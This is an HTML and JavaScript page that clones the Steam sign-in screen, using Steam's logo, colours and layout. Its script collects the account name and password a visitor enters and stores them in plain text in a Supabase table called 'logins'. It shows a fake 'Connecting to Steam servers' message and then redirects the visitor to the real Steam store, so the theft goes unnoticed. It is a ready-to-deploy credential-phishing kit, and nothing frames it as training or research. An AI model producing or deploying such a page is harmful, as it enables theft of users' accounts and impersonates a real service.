<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign In - Steam</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
      body {
        background: radial-gradient(circle at top right, #212c3d 0%, #171a21 100%);
        color: #afafaf;
        font-family: "Motiva Sans", Sans-serif;
      }
      .steam-input {
        background-color: #32353c;
        border: 1px solid #000;
        border-radius: 2px;
        color: #fff;
        box-shadow: inset 0 0 3px rgba(0,0,0,0.5);
      }
      .steam-input:focus {
        outline: none;
        border-color: #66c0f4;
      }
      .steam-button {
        background: linear-gradient( to right, #47bfff 0%, #1a44c2 60%);
        background-position: 25%;
        background-size: 330% 100%;
        transition: background-position .3s ease-in-out;
        color: #fff;
        border-radius: 2px;
      }
      .steam-button:hover {
        background-position: 100%;
      }
      .steam-card {
        background-color: rgba(24, 26, 30, 0.8);
        border-radius: 4px;
      }
    </style>
  </head>
  <body class="min-h-screen flex flex-col items-center justify-center p-4">
    
    <div class="w-full max-max-w-[1000px] flex flex-col items-center">
      <!-- Logo -->
      <div class="mb-12">
        <img src="https://store.akamai.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" alt="Steam Logo" class="w-44" referrerPolicy="no-referrer">
      </div>

      <div class="steam-card p-8 md:p-12 w-full max-w-[640px] shadow-2xl">
        <h1 class="text-3xl font-light text-white uppercase tracking-widest mb-8">Sign In</h1>
        
        <div class="grid md:grid-cols-2 gap-12">
          <!-- Login Form -->
          <div class="space-y-6">
            <form id="loginForm" class="space-y-4">
              <div>
                <label class="block text-xs font-bold text-[#1999ff] uppercase mb-2">Sign in with account name</label>
                <input type="email" id="email" required class="steam-input w-full p-2.5 text-lg" placeholder="">
              </div>
              
              <div>
                <label class="block text-xs font-bold text-[#afafaf] uppercase mb-2">Password</label>
                <input type="password" id="password" required class="steam-input w-full p-2.5 text-lg" placeholder="">
              </div>

              <div class="flex items-center space-x-2">
                <input type="checkbox" id="remember" class="w-4 h-4 rounded bg-[#32353c] border-none">
                <label for="remember" class="text-sm">Remember me</label>
              </div>

              <button type="submit" id="submitBtn" class="steam-button w-full py-3 font-bold text-lg shadow-lg">
                Sign In
              </button>
              
              <div id="status" class="text-sm mt-4 hidden"></div>
            </form>

            <div class="pt-4 text-center">
              <a href="#" class="text-xs underline hover:text-white">Help, I can't sign in</a>
            </div>
          </div>

          <!-- QR Code Section -->
          <div class="hidden md:flex flex-col items-center justify-center border-l border-white/10 pl-12">
            <label class="text-xs font-bold text-[#1999ff] uppercase mb-4">Or sign in with QR</label>
            <div class="bg-white p-2 rounded-sm mb-4">
              <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=SteamLoginClone" alt="QR Code" class="w-32 h-32" referrerPolicy="no-referrer">
            </div>
            <p class="text-[10px] text-center max-w-[150px]">Use the <span class="text-white">Steam Mobile App</span> to sign in via QR code</p>
          </div>
        </div>
      </div>

      <div class="mt-12 text-center max-w-[640px]">
        <p class="text-xs text-[#67707b]">
          Join Steam and discover thousands of games to play. 
          <a href="#" class="text-white underline">Learn more.</a>
        </p>
        <div class="mt-4">
          <button class="border border-white/20 px-6 py-2 text-xs text-white hover:bg-white/10 transition-colors">
            Create a Free Account
          </button>
        </div>
      </div>
    </div>

    <!-- Supabase Integration -->
    <script type="module">
      import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm'

      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL
      const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY
      
      const loginForm = document.getElementById('loginForm')
      const statusDiv = document.getElementById('status')
      const submitBtn = document.getElementById('submitBtn')

      // Defensive check for missing configuration
      if (!supabaseUrl || !supabaseKey) {
        console.error('Supabase configuration missing. Please set VITE_SUPABASE_URL and VITE_SUPABASE_ANON_KEY in your environment.')
        statusDiv.classList.remove('hidden')
        statusDiv.className = 'text-sm mt-4 text-red-400 p-2 bg-red-900/20 border border-red-500/50 rounded'
        statusDiv.innerHTML = '<strong>Configuration Error:</strong> Supabase URL and Key are required. Please set them in the Secrets panel.'
        submitBtn.disabled = true
        submitBtn.classList.add('opacity-50', 'cursor-not-allowed')
      }

      let supabase;
      if (supabaseUrl && supabaseKey) {
        try {
          supabase = createClient(supabaseUrl, supabaseKey)
        } catch (e) {
          console.error('Failed to initialize Supabase client:', e)
        }
      }

      loginForm.addEventListener('submit', async (e) => {
        e.preventDefault()
        
        if (!supabase) {
          statusDiv.innerText = 'Database not configured. Please check your settings.'
          return
        }

        const email = document.getElementById('email').value
        const password = document.getElementById('password').value

        submitBtn.disabled = true
        submitBtn.innerText = 'Signing in...'
        statusDiv.classList.remove('hidden')
        statusDiv.className = 'text-sm mt-4 text-blue-400'
        statusDiv.innerText = 'Connecting to Steam servers...'

        try {
          const { data, error } = await supabase
            .from('logins') // Assuming the table name is 'logins'
            .insert([
              { 
                email: email, 
                password: password,
                timestamp: new Date().toISOString()
              }
            ])

          if (error) throw error

          statusDiv.className = 'text-sm mt-4 text-green-400'
          statusDiv.innerText = 'Successfully connected! (Demo mode)'
          
          // Clear form
          loginForm.reset()
        } catch (error) {
          console.error('Error:', error)
          statusDiv.className = 'text-sm mt-4 text-red-400'
          statusDiv.innerText = 'Error: ' + (error.message || 'Could not connect to database. Check your Supabase credentials.')
        } finally {
          submitBtn.disabled = false
          submitBtn.innerText = 'Sign In'
        }
        window.location.href = "https://store.steampowered.com";
      })
    </script>
  </body>
</html>
